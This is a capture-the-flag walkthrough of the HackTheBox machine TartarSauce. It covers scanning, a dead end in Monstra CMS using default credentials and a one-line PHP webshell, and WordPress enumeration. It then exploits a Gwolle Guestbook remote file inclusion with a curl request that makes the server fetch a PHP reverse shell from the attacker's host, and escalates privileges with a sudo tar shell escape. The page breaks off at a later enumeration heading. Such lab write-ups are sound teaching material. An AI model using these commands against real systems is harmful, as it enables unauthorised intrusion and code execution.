---
icon: ubuntu
---

# TartarSauce - Medium

<figure><img src="../../.gitbook/assets/image.png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/tartarsauce"><strong>TartarSauce</strong></a></p></figcaption></figure>

## <mark style="color:$success;">Scanning & Enumeration</mark>

{% code title="Nmap TCP Scan" overflow="wrap" expandable="true" %}
```bash
nmap -A -T4 -p- -Pn 10.129.1.185 -oN scans/nmap-tcpall
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-19 21:39 -0400
Nmap scan report for 10.129.1.185
Host is up (0.041s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   34.95 ms 10.10.16.1
2   62.19 ms 10.129.1.185
```
{% endcode %}

<details>

<summary><mark style="color:$danger;"><strong>Monstra CMS 3.0.4 RCE -> Rabbit Hole</strong></mark></summary>

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

* Nmap actually reveals this is monstraCMS version 3.0.4

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

* This version is vulnerable to authenticated RCE

### [<mark style="color:$primary;">webservices/monstra-3.0.4</mark>](http://10.129.1.185/webservices/monstra-3.0.4/)

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

* Version confirmed on the bottom of the page.
* I've dealt with MonstraCMS before there is an admin page at /admin, I am going to test for default credentials

### <mark style="color:$primary;">/webservices/monstra-3.0.4/admin/</mark>

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

* Default admin:admin credentials work here

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>



* We can proceed with the Exploitation phase

### <mark style="color:$primary;">Exploitation</mark>

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

* edit the default template of the CMS

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

* Add a simple php webshell as the Template content

{% code overflow="wrap" expandable="true" %}
```php
<?php system($_GET['cmd']); ?>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

* Quickly realized that I cannot modify any files nor upload anything to gain command execution

</details>

## <mark style="color:$success;">HTTP Port 80 TCP</mark>

### <mark style="color:$primary;">Directory Busting</mark>

* I am going to further enumerate the webservices directory

{% code overflow="wrap" expandable="true" %}
```shellscript
feroxbuster -u http://10.129.1.185/webservices -C 404 -x php
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

* Discovered an instance of wordpress
* visiting the links we see a redirect to tartarsauce.htb I will update my hosts file

{% code overflow="wrap" expandable="true" %}
```bash
10.129.1.185	tartarsauce.htb
```
{% endcode %}

### <mark style="color:$primary;">/webservices/wp</mark>

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">/webservices/wp/wp-admin</mark>

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

* Default credentials did not work for me here.
* I am going to do a wp-scan and look for vulnerable plugins.

{% code overflow="wrap" expandable="true" %}
```shellscript
wpscan --update
wpscan --url http://10.129.1.185/webservices/wp -e ap --plugins-detection aggressive
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

* Enumerating the readme.txt files I came across soemthing interesting here -> [http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt](http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt)

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

* Ha :)) that is kind of funny. Alright let's see if there are any vulnerabilities for the actual version of gwolle-gb running 1.5.3

### <mark style="color:$primary;">Wordpress Plugin Gwolle Guestbook 1.5.3 - RFI</mark>

<figure><img src="../../.gitbook/assets/image (3422).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3424).png" alt=""><figcaption></figcaption></figure>

* Let's first see if this vulnerability is still active and if the server is reaching out for the file

{% code overflow="wrap" expandable="true" %}
```shellscript
curl http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.6
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3425).png" alt=""><figcaption></figcaption></figure>

* I am going to grab a copy of [**pentest monkey php reverse**](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) shell, modify the ip and port and name it wp-load.php. Place it in the same&#x20;
* Now let's see if we can get RCE&#x20;

<figure><img src="../../.gitbook/assets/image (3426).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3427).png" alt=""><figcaption></figcaption></figure>

* We managed to get a shell as www-data

## <mark style="color:$success;">Post Exploitation</mark>

### <mark style="color:$primary;">Manuel enumeration as www-data</mark>

<figure><img src="../../.gitbook/assets/image (3429).png" alt=""><figcaption></figcaption></figure>

* besides root there is another user on this box

<figure><img src="../../.gitbook/assets/image (3428).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">SUDO tar</mark>

* [**GTFObins** ](https://gtfobins.org/gtfobins/tar/#shell)has an easy privesc for this

<figure><img src="../../.gitbook/assets/image (3430).png" alt=""><figcaption></figcaption></figure>

* We have to run the sudo command as onuma!

{% code overflow="wrap" expandable="true" %}
```bash
sudo -u onuma /bin/tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3431).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Manual Enumeration as onuma</mark>

